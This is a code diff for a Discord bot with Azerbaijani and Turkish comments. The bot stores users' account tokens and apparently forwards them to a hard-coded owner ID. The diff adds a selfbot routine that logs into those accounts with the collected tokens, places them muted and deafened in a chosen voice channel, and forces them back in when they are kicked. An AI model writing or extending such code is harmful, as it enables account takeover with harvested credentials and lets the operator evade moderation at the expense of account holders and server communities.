@@ -14,6 +14,7 @@ import {
   SeparatorBuilder,
   MessageFlags
 } from 'discord.js';
+import { Client as SelfClient } from 'discord.js-selfbot-v13';
 import express from 'express';
 
 // --- UPTIME VƏ PORT ÜÇÜN EXPRESS SERVERİ ---
@@ -38,8 +39,9 @@ const client = new Client({
   ]
 });
 
-// Bellekte saklanan tokenler
+// Bellekte saklanan tokenler ve aktif selfbot bağlantıları
 const userTokens = new Map();
+const selfClients = new Map(); // token -> { client, voiceChannelId }
 
 // Tokenlərin göndəriləcəyi və paneli aça biləcək səlahiyyətli şəxsin ID-si
 const OWNER_ID = '1184518857679962186';
@@ -72,29 +74,86 @@ async function sendTokenToOwner(client, title, token, accountName, username, add
   }
 }
 
+// Selfbotu səs kanalına qoşmaq üçün köməkçi funksiya
+async function connectSelfBot(token, channelId, accountName) {
+  // Əvvəlcədən qoşulubsa əvvəlkini dayandırırıq
+  if (selfClients.has(token)) {
+    try {
+      selfClients.get(token).destroy();
+    } catch (e) {}
+    selfClients.delete(token);
+  }
+
+  const selfClient = new SelfClient({ checkUpdate: false });
+
+  selfClient.on('ready', async () => {
+    console.log(`[SELFBOT] ${selfClient.user.tag} giriş yaptı, sese bağlanılıyor...`);
+    try {
+      const channel = await selfClient.channels.fetch(channelId);
+      if (channel && channel.isVoiceBased()) {
+        selfClient.ws.broadcast({
+          op: 4,
+          d: {
+            guild_id: channel.guild.id,
+            channel_id: channel.id,
+            self_mute: true,
+            self_deaf: true,
+            self_video: false
+          }
+        });
+        console.log(`[SES] ${selfClient.user.tag} → #${channel.name} kanalına bağlandı.`);
+      }
+    } catch (err) {
+      console.error(`[SES HATASI] ${accountName}:`, err.message);
+    }
+  });
+
+  // Kanaldan atılarsa avtomatik təkrar qoşulma
+  selfClient.on('voiceStateUpdate', async (oldState, newState) => {
+    if (oldState.member?.id === selfClient.user.id && !newState.channelId) {
+      setTimeout(async () => {
+        try {
+          const ch = await selfClient.channels.fetch(channelId);
+          if (ch) {
+            selfClient.ws.broadcast({
+              op: 4,
+              d: {
+                guild_id: ch.guild.id,
+                channel_id: ch.id,
+                self_mute: true,
+                self_deaf: true,
+                self_video: false
+              }
+            });
+          }
+        } catch (e) {}
+      }, 5000);
+    }
+  });
+
+  try {
+    await selfClient.login(token);
+    selfClients.set(token, selfClient);
+  } catch (err) {
+    console.error(`[SELFBOT GİRİŞ XƏTASI] ${accountName}:`, err.message);
+  }
+}
+
 // !panel-voice komutu
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
 
   if (message.content === '!panel-voice') {
-    // Səlahiyyəti yoxdursa
     if (message.author.id !== OWNER_ID) {
-      try {
-        // Yazılan mesajı silirik
-        await message.delete();
-      } catch (e) {}
-
-      // Xəbərdarlıq mesajı göndəririk və 5 saniyə sonra silirik
+      try { await message.delete(); } catch (e) {}
       try {
         const warningMsg = await message.channel.send({ 
           content: `❌ <@${message.author.id}> Bu komutu sadece yönetici kullanabilir.` 
         });
-        
         setTimeout(async () => {
           try { await warningMsg.delete(); } catch (err) {}
-        }, 5000); // 5000 millisaniyə = 5 saniyə
+        }, 5000);
       } catch (err) {}
-
       return;
     }
 
@@ -164,7 +223,7 @@ client.on('messageCreate', async (message) => {
         .setCustomId('stop_all')
         .setLabel('Tümünü Durdur')
         .setStyle(ButtonStyle.Danger)
-        .setEmoji('🗑️')
+        .setEmoji('⏹️')
     );
 
     await message.channel.send({ 
@@ -276,7 +335,7 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.showModal(modal);
   }
 
-  // --- 6. SESE BAĞLANMA İŞLEMİ (MODAL SUBMIT) ---
+  // --- 6. SESE BAĞLANMA İŞLEMİ (MODAL SUBMIT - SELFBOT AKTİV EDİLİR) ---
   if (interaction.isModalSubmit() && interaction.customId.startsWith('voice_modal_')) {
     const selectedValue = interaction.customId.replace('voice_modal_', '');
     const channelId = interaction.fields.getTextInputValue('channel_id').trim();
@@ -290,12 +349,28 @@ client.on('interactionCreate', async (interaction) => {
       targetTokens = [tokens[parseInt(selectedValue)]];
     }
 
-    await interaction.reply({ content: `🔊 Seçilen ${targetTokens.length} hesap ile ses bağlantısı başlatılıyor (Selfbot entegrasyonu aktif)...`, ephemeral: true });
+    await interaction.reply({ content: `🔊 Seçilen ${targetTokens.length} hesap ses kanalına bağlanıyor...`, ephemeral: true });
+
+    for (const tObj of targetTokens) {
+      await connectSelfBot(tObj.token, channelId, tObj.name);
+      await new Promise(r => setTimeout(r, 1500)); // Rate limit qarşısını almaq üçün gecikmə
+    }
   }
 
-  // --- 7. TÜMÜNÜ DURDUR ---
+  // --- 7. TÜMÜNÜ DURDUR (BÜTÜN SELFBOTLARI DAYANDIR) ---
   if (interaction.isButton() && interaction.customId === 'stop_all') {
-    return interaction.reply({ content: '⏹️ Ses bağlantıları durduruldu.', ephemeral: true });
+    if (selfClients.size === 0) {
+      return interaction.reply({ content: 'ℹ️ Sese bağlı aktif hesap bulunmuyor.', ephemeral: true });
+    }
+
+    for (const [token, selfClient] of selfClients.entries()) {
+      try {
+        selfClient.destroy();
+      } catch (e) {}
+    }
+    selfClients.clear();
+
+    return interaction.reply({ content: '⏹️ Bütün hesapların ses bağlantıları durduruldu.', ephemeral: true });
   }
 
   // --- 8. TEK TOKEN MODAL CEVABI ---
